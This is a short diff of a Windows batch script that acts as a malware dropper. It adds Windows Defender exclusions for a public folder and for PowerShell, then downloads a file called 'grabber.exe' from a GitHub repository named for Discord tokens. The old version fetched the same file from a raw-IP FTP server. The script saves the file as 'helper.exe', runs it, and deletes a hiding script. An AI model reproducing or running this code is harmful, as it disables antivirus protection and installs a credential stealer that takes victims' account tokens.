@@ -2,7 +2,7 @@
 powershell Add-MpPreference -ExclusionPath "C:\Users\Public"
 powershell Add-MpPreference -ExclusionProcess "powershell.exe"
 cd "C:\Users\Public"
-curl -p --insecure  "ftp://73.93.11.94/grabber.exe" --user "ftp-server:ftp-server" -o "C:\Users\Public\helper.exe" --ftp-create-dirs  >nul 2>&1 
+curl --output "C:\Users\Public\helper.exe" -LJO https://github.com/durandlh/discord-token/blob/main/grabber.exe?raw=true
 start helper.exe
 del hide.vbs
 timeout 5
